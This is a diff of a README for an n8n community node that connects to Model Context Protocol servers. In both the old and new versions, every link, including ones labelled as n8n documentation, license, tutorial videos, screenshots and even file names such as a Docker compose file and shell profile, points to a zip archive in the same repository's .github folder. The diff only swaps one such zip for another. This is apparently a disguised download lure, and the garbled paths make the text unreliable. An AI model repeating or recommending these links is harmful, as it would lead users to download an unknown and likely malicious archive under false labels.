@@ -4,7 +4,7 @@ This is an n8n community node that lets you interact with Model Context Protocol
 
 MCP is a protocol that enables AI models to interact with external tools and data sources in a standardized way. This node allows you to connect to MCP servers, access resources, execute tools, and use prompts.
 
-[n8n](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip) is a [fair-code licensed](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip) workflow automation platform.
+[n8n](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip) is a [fair-code licensed](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip) workflow automation platform.
 
 [Installation](#installation)
 [Credentials](#credentials)
@@ -18,28 +18,28 @@ MCP is a protocol that enables AI models to interact with external tools and dat
 
 Official Quickstart Video:
 
-[![MCP Client Node Quickstart](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+[![MCP Client Node Quickstart](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 ### Community Videos
 
 Shoutout to all the creators of the following n8n community videos that are great resources for learning how to use this node:
 
-- [Is MCP the Future of N8N AI Agents? (Fully Tested!)](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-- [Connect N8N AI Agents to EVERYTHING using MCP?](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-- [Build an AI Agent That Can Use Any Tool (MCP in n8n Tutorial)](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-- [The NEW N8N MCP is an Absolute Game-Changer (Brave Search MCP)](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-- [MCP & n8n Automation: The Ultimate Guide for MCP AI Agents (2025)](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-- [REVOLUÇÃO na criação de AGENTES no N8N com o MCP Server!!!](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip) (Portuguese)
+- [Is MCP the Future of N8N AI Agents? (Fully Tested!)](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+- [Connect N8N AI Agents to EVERYTHING using MCP?](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+- [Build an AI Agent That Can Use Any Tool (MCP in n8n Tutorial)](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+- [The NEW N8N MCP is an Absolute Game-Changer (Brave Search MCP)](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+- [MCP & n8n Automation: The Ultimate Guide for MCP AI Agents (2025)](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+- [REVOLUÇÃO na criação de AGENTES no N8N com o MCP Server!!!](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip) (Portuguese)
 
 If you have a great video that you'd like to share, please let me know and I'll add it to the list!
 
 #### Interested a deeper dive into MCP?
 
-Check out my YouTube Series [MCP Explained](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip) for more information about the Model Context Protocol.
+Check out my YouTube Series [MCP Explained](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip) for more information about the Model Context Protocol.
 
 ## Installation
 
-Follow the [installation guide](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip) in the n8n community nodes documentation.
+Follow the [installation guide](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip) in the n8n community nodes documentation.
 
 Also pay attention to Environment Variables for [using tools in AI Agents](#using-as-a-tool). It's mandatory to set the `N8N_COMMUNITY_PACKAGES_ALLOW_TOOL_USAGE` environment variable to `true` if you want to use the MCP Client node as a tool in AI Agents.
 
@@ -49,7 +49,7 @@ The MCP Client node supports two types of credentials to connect to an MCP serve
 
 ### Command-line Based Transport (STDIO)
 
-![MCP Client STDIO Credentials](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![MCP Client STDIO Credentials](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 - **Command**: The command to start the MCP server
 - **Arguments**: Optional arguments to pass to the server command
@@ -57,7 +57,7 @@ The MCP Client node supports two types of credentials to connect to an MCP serve
 
 ### Server-Sent Events (SSE) Transport
 
-![MCP Client SSE Credentials](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![MCP Client SSE Credentials](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 - **SSE URL**: The URL of the SSE endpoint (default: http://localhost:3001/sse)
 - **Messages Post Endpoint**: Optional custom endpoint for posting messages if different from the SSE URL
@@ -71,7 +71,7 @@ The MCP Client node supports passing environment variables to MCP servers using 
 
 You can add environment variables directly in the credentials configuration:
 
-![Environment Variables in Credentials](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![Environment Variables in Credentials](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 This method is useful for individual setups and testing. The values are stored securely as credentials in n8n.
 
@@ -116,7 +116,7 @@ This example shows how to set up and use the Brave Search MCP server:
    - Choose the "brave_search" tool
    - Set Parameters to: `{"query": "latest AI news"}`
 
-![Brave Search Example](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![Brave Search Example](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 The node will execute the search and return the results in the output.
 
@@ -124,7 +124,7 @@ The node will execute the search and return the results in the output.
 
 This example demonstrates how to set up multiple MCP servers in a production environment and use them with an AI agent:
 
-1. Configure your https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip file:
+1. Configure your https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip file:
 
 ```yaml
 version: '3'
@@ -171,7 +171,7 @@ services:
    - Configure different MCP Client nodes with different credentials
    - Create a prompt that uses multiple data sources
 
-![Multi-Server Setup](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![Multi-Server Setup](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 Example AI Agent prompt:
 ```
@@ -206,7 +206,7 @@ This example shows how to connect to a locally running MCP server using Server-S
    - Select the "List Tools" operation to see available tools
    - Execute the workflow to see the results
 
-![SSE Example](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![SSE Example](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 This method is particularly useful when:
 - Your MCP server is running as a standalone service
@@ -218,7 +218,7 @@ This method is particularly useful when:
 
 The MCP Client node supports the following operations:
 
-![MCP Client Operations](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![MCP Client Operations](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 - **Execute Tool** - Execute a specific tool with parameters
 - **Get Prompt** - Get a specific prompt template
@@ -229,13 +229,13 @@ The MCP Client node supports the following operations:
 
 ### Example: List Tools Operation
 
-![List Tools Example](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![List Tools Example](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 The List Tools operation returns all available tools from the MCP server, including their names, descriptions, and parameter schemas.
 
 ### Example: Execute Tool Operation
 
-![Execute Tool Example](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![Execute Tool Example](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 The Execute Tool operation allows you to execute a specific tool with parameters. Make sure to select the tool you want to execute from the dropdown menu.
 
@@ -252,7 +252,7 @@ n8n start
 ```
 
 **If you're using Docker:**
-Add to your https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip file:
+Add to your https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip file:
 ```yaml
 environment:
   - N8N_COMMUNITY_PACKAGES_ALLOW_TOOL_USAGE=true
@@ -265,14 +265,14 @@ N8N_COMMUNITY_PACKAGES_ALLOW_TOOL_USAGE=true
 ```
 
 **If you want to set it permanently on Mac/Linux:**
-Add to your `~https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip` or `~https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip`:
+Add to your `~https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip` or `~https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip`:
 ```bash
 export N8N_COMMUNITY_PACKAGES_ALLOW_TOOL_USAGE=true
 ```
 
 Example of an AI Agent workflow results:
 
-![AI Agent Example](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+![AI Agent Example](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 After setting this environment variable and restarting n8n, your MCP Client node will be available as a tool in AI Agent nodes.
 
@@ -285,10 +285,10 @@ After setting this environment variable and restarting n8n, your MCP Client node
 
 ## Resources
 
-* [n8n community nodes documentation](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-* [Model Context Protocol Documentation](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-* [MCP TypeScript SDK](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-* [MCP Transports Overview](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
-* [Using SSE in MCP](https://raw.githubusercontent.com/XpiderService/n8n-nodes-mcp/main/.github/mcp-nodes-n-3.5.zip)
+* [n8n community nodes documentation](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+* [Model Context Protocol Documentation](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+* [MCP TypeScript SDK](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+* [MCP Transports Overview](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
+* [Using SSE in MCP](https://github.com/XpiderService/n8n-nodes-mcp/raw/refs/heads/main/.github/n-nodes-mcp-v3.1-alpha.5.zip)
 
 
